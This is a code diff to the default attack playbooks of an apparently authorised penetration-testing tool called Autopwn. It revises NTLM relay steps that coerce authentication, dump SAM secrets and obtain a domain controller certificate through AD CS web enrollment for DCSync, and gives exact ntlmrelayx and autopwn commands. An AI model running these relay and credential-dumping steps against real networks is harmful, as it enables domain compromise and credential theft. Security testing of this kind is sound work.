@@ -316,10 +316,14 @@ DEFAULT_PLAYBOOKS = [
                   recommendation="Patch MS-RPRN/MS-EFSR, disable the Print Spooler on DCs, "
                          "enforce SMB signing and EPA, and disable NTLM."),
             _step(3, "Relay to the unsigned host", "start",
-                  "ntlmrelayx (run as a listener: -t smb://<target> -smb2support)",
+                  "ntlm_relay (mode=smb — auto-orchestrates listener + coercion; run as root)",
                   ["relay_targets", "coerced"], ["hash", "admin"],
-                  "Start ntlmrelayx first, then step 2 coerces auth into it; it relays to "
-                  "the signing:False host for a SAM/secrets dump or command execution.",
+                  "Autopwn's built-in ntlm_relay tool starts ntlmrelayx, coerces the target "
+                  "into it, and dumps the SAM automatically. Run as root against the launch "
+                  "target: sudo autopwn run --tool ntlm_relay --set target=<coerced host> "
+                  "--set relay_to=<signing:False host> --set mode=smb. Both hosts must be in "
+                  "scope. (In-console it stays documentation because the web service is "
+                  "non-root and can't bind 445.)",
                   "final"),
         ],
     },
@@ -848,10 +852,14 @@ DEFAULT_PLAYBOOKS = [
                   recommendation="Require HTTPS + Extended Protection for Authentication on "
                          "the CA web enrollment, or disable it."),
             _step(3, "Relay coerced auth to the CA (ntlmrelayx --adcs)", "have credential",
-                  "ntlmrelayx (listener: -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController)",
+                  "ntlm_relay (mode=adcs — auto-orchestrates listener + coercion; run as root)",
                   ["coerced", "adcs_vuln"], ["certificate"],
-                  "Start ntlmrelayx --adcs first, then step 1 coerces the DC into it; it "
-                  "relays the DC's NTLM to web enrollment and receives a base64 certificate."),
+                  "Autopwn's built-in ntlm_relay tool starts ntlmrelayx --adcs, coerces the DC "
+                  "into it, and captures the DC's certificate automatically. Run as root "
+                  "against the launch target: sudo autopwn run --tool ntlm_relay --set "
+                  "target=<DC> --set relay_to=<CA host> --set mode=adcs. Both hosts must be in "
+                  "scope. (In-console it stays documentation because the web service is "
+                  "non-root and can't bind 445.)"),
             _step(4, "Authenticate with the DC certificate → DCSync", "have credential",
                   "certipy_auth (use the relayed DC cert) → secretsdump -k", ["certificate"],
                   ["hash", "admin", "flag"],
